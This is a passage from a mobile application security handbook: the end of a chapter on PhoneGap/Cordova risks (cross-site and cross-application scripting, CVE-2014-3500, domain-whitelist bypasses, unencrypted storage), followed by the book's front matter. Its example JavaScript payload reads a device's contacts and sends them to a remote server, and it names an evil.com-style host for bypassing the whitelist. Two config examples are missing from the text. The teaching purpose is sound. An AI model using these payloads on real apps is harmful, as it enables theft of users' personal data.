quality: 50,
destinationType: Camera.DestinationType.DATA_URL,
sourceType: Camera.PictureSourceType.CAMERA
});
This example will take a photo using the device’s camera and return a base64-encoded string to the
onPhotoDataSuccess() callback. In a cross-site scripting attack of a PhoneGap application, a malicious payload
could abuse this feature to take a photo and upload the base64-encoded image to an attacker-controlled server
using XMLHttpRequest() or PhoneGap API FileTransfer.upload()method.
A malicious payload could also pilfer the device’s contact database using the PhoneGap Javascript API, a simple
example of how you might search for a user named “Herman” and upload their contact information to a remote
web server looks like this:
function onSuccess(contacts) {
var url = "http://www.mobileapphacker.com/getcontact";
var params = "givenname="+contacts[0].name.givenName+ \
"familyname="+contacts[0].name.familyName;
var http = new XMLHttpRequest();
http.open("GET", url+"?"+params, true);
};
function onError(contactError) {
alert('onError!');
};
var options = new ContactFindOptions();
options.filter = "Herman";
options.multiple = true;
options.desiredFields = [navigator.contacts.fieldType.id];
var fields = [navigator.contacts.fieldType.displayName,
navigator.contacts.fieldType.name];
navigator.contacts.find(fields, onSuccess, onError, options);
The other features of PhoneGap can be accessed in a similar way; these examples serve to illustrate the
simplicity with which powerful native functionality can be accessed using JavaScript.
PhoneGap and Cordova Security
Neither PhoneGap nor the Cordova framework has come under any close scrutiny from the security community.
However, as these technologies are a blend of native mobile applications and web applications it will come as no
surprise to you that much of what you have learned in the previous chapters is applicable to your testing
methodology. A number of framework-specific security considerations that you should be aware of are detailed
in this section.
Furthermore, as Cordova applications rely heavily on HTML5, there are a number of HTML5-specific security
concerns that apply. These will not be covered in this section but are detailed at length by OWASP
(https://www.owasp .org/index.php/HTML5_Security_Cheat_Sheet).
MULTIPLE VULNERABILITIES IN CORDOVA FRAMEWORK
In August 2014, David Kaplan and Roee Hay released a series of vulnerabilities that affected versions prior
to 3.5.1 of the Cordova framework. When chained together and with some moderate user interaction,
these issues are capable of exfiltrating data from the filesystem of an Android device running a Cordova-
based application.
To learn more about these vulnerabilities you should consult the following whitepaper:
https://www.slideshare.net/ibmsecurity/remote-exploitation- of-the-cordova-framework/
While some of these issues are specific to the framework, they accurately describe the types of
vulnerabilities found in cross-platform applications.
Cross-Application and Cross-Site Scripting Attacks
Cross-platform frameworks are heavily dependent on the Webview-embedded browser available across the
different platforms. It also stands to reason that any situation whereby attacker-controlled data is populated
into Webviews provides an opportunity for cross-application or cross-site scripting attacks. You should already
have an understanding of how cross-site scripting (XSS) attacks work. Cross-application scripting (XAS) attacks
are a similar type of attack but with a slight twist; in this attack the scripting is loaded into the Webview by
another application. This type of attack can commonly occur in these scenarios:
Tainted content is loaded from a server-side web application (XSS) to the Webview
Arbitrary URLs passed from IPC mechanisms (XAS) are loaded
Arbitrary data is loaded via an IPC mechanism that is loaded into a Webview and dynamically populated into
a JavaScript block or passed directly to eval() (XAS)
An example of such a vulnerability was found in Cordova on Android (and by association also PhoneGap) by
David Kaplan and Roee Hay and is described in CVE-2014-3500. This specific issue allowed an arbitrary URL to
be populated into a Cordova Webview when another third party application invoked an intent. The affected code
existed in the CordovaWebView class, which had a loadUrl() method similar to the following code:
1 public void loadUrl(String url) {
2 if(url.equals("about:blank") || url.startsWith("javascript:")) {
3 this.loadUrlNow(url);
4 } else{
5 String initUrl=this.getProperty("url",null);
6
7 if(initUrl==null){
8 this.loadUrlIntoView(url);
9 }
10 else{
11 this.loadUrlIntoView(initUrl);
12 }
13 }
14 }
The vulnerable code loads the value of the initUrl parameter into the Webview, which is populated using the
following method:
1 public String getProperty(String name, String defaultValue) {
2 Bundle bundle=this.cordova.getActivity().getIntent().getExtras();
3 if(bundle==null){
4 return defaultValue;
5 }
6 Object p=bundle.get(name);
7 if(p==null){
8 return defaultValue;
9 }
10 return p.toString();
11 }
Studying the previous code should make the vulnerability relatively obvious; launching the activity with an
intent bundle that includes a malicious URL will cause it to be populated into the Webview. To find out more
about how this issue was exploited you should refer to the whitepaper (https://www.slideshare
.net/ibmsecurity/remote-exploitation-of-the-cordova-framework/).
Understanding Domain Whitelisting
Domain whitelisting is a security control present in PhoneGap and other Cordova-based applications. Domain
whitelisting defines the external domains outside of the application’s control but to which access should be
permitted. Domains that are whitelisted will have access to the Cordova JavaScript objects and corresponding
Cordova bridge. The whitelist can be configured using the applications config.xml file, which may look as
follows:
This example would permit access to any resources on the mobileapphacker.com domain but not subdomains,
and only when using the HTTPS protocol. Subdomains could be permitted using the subdomains="true"
attribute.
An example of an insecure whitelist, which allows unrestricted access to any domain, would be:
You should be aware that this is also the default configuration for a Cordova-based application.
Domain whitelisting is an important security control when defining the resources that an application can access.
As you may recall from earlier chapters, due to the same origin policy any content loaded using the file://
protocol handler will have access to the filesystem. Therefore, any malicious third-party application that is able
to exploit an XAS vulnerability and cause a URL from a shared resource on the local filesystem (e.g., /sdcard/)
to be loaded, may be able to exploit the XAS issue to bypass sandbox restrictions and access content in the
Cordova-based application’s sandbox.
In the past the whitelist restrictions have been found to be subvertible. For example, in Cordova 2.9.x it was
discovered that substrings of the domain could be used to bypass the whitelist. For example,
“https://mobileapphacker.com .evil.com” could be used to bypass a whitelist for “mobileapphacker.com”. This
is because the Cordova pattern-matching engine was matching anything after the domain (i.e.,
https://mobileapphacker.com*) as valid. An attacker with the ability to create his own DNS records could then
subvert this logic using a subdomain. This was fixed in Cordova 3.x.
There are also some platform-specific quirks that you should be aware of. For example, domain whitelisting is
not supported on Android applications or devices that use API 10 or lower. While whitelisting can be bypassed in
Windows Phone 7 and 8 applications by using an iframe or an XMLHttpRequest(), an attacker can load any
domain in an iframe or with AJAX and that domain will have access to the Cordova bridge.
APACHE CORDOVA WHITELIST BYPASS FOR NON-HTTP URLS
Apache Cordova for Android overloads the Android frameworks shouldInterceptRequest() method to
intercept and inspect URLs before they are loaded. You should be aware that this method is not all
encompassing and some protocols exist that cannot be intercepted using this technique. As of Android 4.4,
Web Sockets is one such protocol and could be used to bypass the Cordova whitelisting implementation.
Iframes and Callbacks
When a whitelisted domain is loaded into the Webview, it has implicit access to the Cordova bridge. If, however,
a whitelisted domain also loads content via an iframe the loaded content will also have access to the bridge. A
simple example of that may be whitelisting an advertising network. If the ads are loaded by an iframe it may
inadvertently expose the Cordova bridge to any third-party sites, meaning that a malicious ad could perform any
actions that the Cordova application itself could perform. There is, however, one exception to this: when
Cordova is used on iOS. In this case all URLs are intercepted.
Encrypted Storage
Cordova’s filesystem APIs do not support encryption. Instead, it relies on the default behavior of the platform.
For example, Cordova applications running on iOS 7 or above will inherit the default data protection class C
(kSecAttrAccessibleAfterFirstUnlock) for data at rest encryption. However, on some platforms, such as
Windows Phone, where encryption is not supported by default, content may be stored on the filesystem in
plaintext. This is obviously a problem for applications that require secure, persistent storage. There are various
solutions to this problem, including native plugins that use SQLCipher or platform-specific workarounds using
the Android keystore or iOS keychain. When assessing a Cordova-based application you should pay specific
attention to any content that is persistently stored and investigate what, if any, encryption mechanisms are in
place.
Summary
This chapter introduced the concept of cross-platform mobile applications and the various security concerns
associated with this type of application.
A key consideration for cross-platform applications is whether or not a native bridge exists and, if so, whether it
is exposed in any way. This chapter detailed the various methods of implementing native bridges across the
different platforms. It also introduced the two most common methods of exploiting bridges: cross-application
scripting and cross-site scripting.
Exploitation of cross-application or cross-site scripting vulnerabilities in cross-platform applications can be
quite serious, particularly if a native bridge exists. Cross-platform frameworks, such as Cordova, use whitelisting
to attempt to reduce the exposure of the bridge but in many cases this is not all encompassing and as you have
learned in this chapter, can be bypassed in certain circumstances.
As the trend for developing cross-platform applications grows, it is likely that they will come under greater
scrutiny from the security community in the future and other avenues of attack will be discovered.
The Mobile Application Hacker’s Handbook
Published by
John Wiley & Sons, Inc.
10475 Crosspoint Boulevard
Indianapolis, IN 46256
www.wiley.com
Copyright © 2015 by John Wiley & Sons, Inc., Indianapolis, Indiana
Published simultaneously in Canada
ISBN: 978-1-118-95850-6
ISBN: 978-1-118-95852-0 (ebk)
ISBN: 978-1-118-95851-3 (ebk)
No part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or by any means, electronic, mechanical,
photocopying, recording, scanning or otherwise, except as permitted under Sections 107 or 108 of the 1976 United States Copyright Act, without either
the prior written permission of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright Clearance Center, 222
Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the Publisher for permission should be addressed to the
Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at
http://www.wiley.com/go/permissions.
Limit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or warranties with respect to the accuracy or
completeness of the contents of this work and specifically disclaim all warranties, including without limitation warranties of fitness for a particular
purpose. No warranty may be created or extended by sales or promotional materials. The advice and strategies contained herein may not be suitable for
every situation. This work is sold with the understanding that the publisher is not engaged in rendering legal, accounting, or other professional services.
If professional assistance is required, the services of a competent professional person should be sought. Neither the publisher nor the author shall be
liable for damages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation and/or a potential source of
further information does not mean that the author or the publisher endorses the information the organization or website may provide or
recommendations it may make. Further, readers should be aware that Internet websites listed in this work may have changed or disappeared between
when this work was written and when it is read.
For general information on our other products and services please contact our Customer Care Department within the United States at (877) 762-2974,
outside the United States at (317) 572-3993 or fax (317) 572-4002.
Wiley publishes in a variety of print and electronic formats and by print-on-demand. Some material included with standard print versions of this book
may not be included in e-books or in print-on-demand. If this book refers to media such as a CD or DVD that is not included in the version you
purchased, you may download this material at http://booksupport.wiley.com. For more information about Wiley products, visit www.wiley.com.
Library of Congress Control Number: 2014954689
Trademarks: Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States
and other countries, and may not be used without written permission. All other trademarks are the property of their respective owners. John Wiley &
Sons, Inc. is not associated with any product or vendor mentioned in this book.
I would like to dedicate this book to my wife Adele and thank her for her continued support not only whilst
working on this book but throughout my career.
—Dominic
I would like to dedicate this book to Wendy, the love of my life. I cannot wait to spend my time with someone
who understands me so well. You support me tirelessly in spite of me pursuing many time-consuming projects.
You are owed many movie nights and a catch-up on time where I was absent while writing.
—Tyrone
I would like to dedicate this book to my parents, Jill and Andy, as well as my brother Dave, for all the support
and encouragement they have given me over the years. My friends are also owed immensely for their support
and friendship over the years.
—Shaun
I would like to dedicate this book to Ilma who for over a decade has kept the home fire burning whilst I—ve
pursed my passion around the globe.
—Ollie
About the Authors
Dominic Chell is a cofounder of MDSec, where in addition to leading the mobile practice, he is responsible for
delivering consultancy and training engagements for a variety of clients. Dominic’s career has spanned over a
decade and has been almost entirely focused on the technical aspects of application security. He has spoken at
numerous conferences as well as releasing several publications on mobile security. Dominic is also listed as a
subject matter expert for a secure iOS development exam.
Tyrone Erasmus has a degree in computer engineering and is currently the head of mobile security at MWR
InfoSecurity South Africa. He enjoys delving into many different areas of penetration testing and security
research, with a large portion of his research efforts in the past spent on Android. His interests lie
predominantly in offensive security and the advancement of tools and new techniques in this sphere. He has
spoken at various security conferences, and was part of the team that won the Android category at Mobile
Pwn2Own in 2012. His work is acknowledged internationally in the Android hacking space, and he is known
among peers as a well-rounded security professional.
Shaun Colley is a principal security consultant for IOActive where he focuses on mobile device security, native
code review, and reverse engineering. During his career, he has been primarily focused on mobile security and
reverse engineering. Shaun has also spoken several times at industry meets and conferences. He holds a BSc
(Hons) in Chemistry from the University of Leeds, England.
Ollie Whitehouse is technical director for NCC Group, where he is responsible for Cyber Defence Operations,
Managed Services, and its Exploit Development Group along technical innovation across the Technical Security
Consulting practice. Ollie's career has spanned nearly two decades and included research, consultancy, and
management positions at BlackBerry, Symantec, and @stake where he specialized in software, mobile,
embedded, wireless, and telecommunications security.
About the Technical Editor
Rob Shimonski (www.shimonski.com) is a best-selling author and editor with over 15 years’ experience
developing, producing, and distributing print media in the form of books, magazines, and periodicals. To date,
Rob has successfully created over 100 books that are currently in circulation. Rob has worked for countless
companies to include CompTIA, Microsoft, Wiley, Cisco, the National Security Agency, and Digidesign.
Rob has over 20 years’ experience working in IT, networking, systems, and security. He is a veteran of the US
military and has been entrenched in security topics and assignments his entire professional career. In the
military, Rob was assigned to a communications (radio) battalion supporting training efforts and exercises.
Having worked with mobile phones since their inception, Rob is an expert in mobile phone development and
security.
Credits
Executive Editor
Carol Long
Project Editor
Sydney Argenta
Technical Editor
Rob Shimonski
Production Editor
Rebecca Anderson
Copy Editor
Paula Lowell
Manager of Content Development and Assembly
Mary Beth Wakefield
Marketing Director
David Mayhew
Marketing Manager
Carrie Sherrill
Professional Technology and Strategy Director
Barry Pruett
Business Manager
Amy Knies
Associate Publisher
Jim Minatel
Project Coordinator, Cover
Patrick Redmond
Proofreader
Sarah Kaikini, Word One New York
Indexer
Johnna VanHoose Dinse
Cover Designer
Wiley
Cover Image
Clockwork gears © iStock.com/Ryhor Bruyeu; App icon © iStock.com/ -cuba-
Acknowledgments
Firstly, Dominic would like to thank the other authors for their hard work in developing this book; without their
contributions it would have been too big a mountain to climb! Dominic would also like to acknowledge the
support of his colleagues from MDSec, in particular Marcus Pinto, Dan Brown, Ryan Chell, and Matthew Hickey
who worked tirelessly to pick up the slack whilst he was writing this book. He would also like to highlight the
great work that the wider security community has done in this field and which provided a foundation for him to
expand his knowledge—where applicable, this work has been properly referenced in this book. Dominic is also
indebted to the numerous individuals that he has had the pleasure of working with through the years and from
who he learnt so much, including Dafydd Stuttard, John Heasman, Peter Winter-Smith, Adam Matthews,
Sherief Hammad, and the rest of the team at the old NGS Software. Finally, Dominic would like to thank his
parents for everything that they have done and continue to do; their support has been invaluable over the years.
Tyrone would like to acknowledge Daniel and the rest of the team at MWR for tinkering alongside him on
Android and sharing their knowledge, as well as Riaan and Harry for supporting him through his career. He
would also like to acknowledge his family and friends who keep an active interest in his life and reminded him
that there is life beyond his computer screen. Finally, Tyrone would like to thank Dominic for contacting him
out of the blue to be a part of the author team!
Shaun would like to thank all the authors of this book in helping to make it a reality; who knows where the idea
for this book would be without them. Shaun would also like to thank his colleagues at IOActive for their support
while writing this book. He would like to acknowledge all those with whom he has shared in interesting
conversations about computer security and other completely unrelated real-life topics, including Dominic Chell,
Marcus Pinto, Matthew Hickey, John Heasman, Ilja van Sprundel, Peter Winter-Smith, Ben Harrison-Smith,
Vincent Berg, and Shane Macaulay, among others. Finally, Shaun would like to thank his parents, Jill and Andy,
his brother Dave, and the rest of his family for their continued support during his career; as well as his friends,
just for being awesome mates.
Ollie would like to say thanks to all the security researchers who have published their security research relating
to BlackBerry technologies, including Zach Lanier, Ben Nell, Ralf-Philipp Weinmann, Shivang Desa, Tim Brown,
Alex Plaskett, Daniel Martin Gomez, and Andy Davis. Without the hard work and perseverance of these
individuals, public understanding would not be where it is today. He would also like to thank the numerous
individuals he’s been lucky enough to work closely with over the years and from whom he learned so much,
including Foob, Nathan Catlow, Bambam, Rob Wood, Aaron Adams, Pete Beck, Paul Collett, Paul Ashton,
Jeremy Boone, Jon Lindsay, Graham Murphy, and Ian Robertson. Ollie’s final thanks is to Twitter, for providing
continual distractions, and Kismet (the cat) for keeping him company on weekends whilst he wrote his chapters.
Finally, as a team, we are grateful to the people at Wiley—in particular, to Carol Long, Sydney Argenta, and the
rest of our editorial team. Their help in developing and polishing our manuscript was invaluable, and apologies
again for testing our deadlines. In particular, a big apology from Shaun who loves nothing more than leaving
everything till the last minute!
WILEY END USER LICENSE AGREEMENT
Go to www.wiley.com/go/eula to access Wiley’s ebook EULA.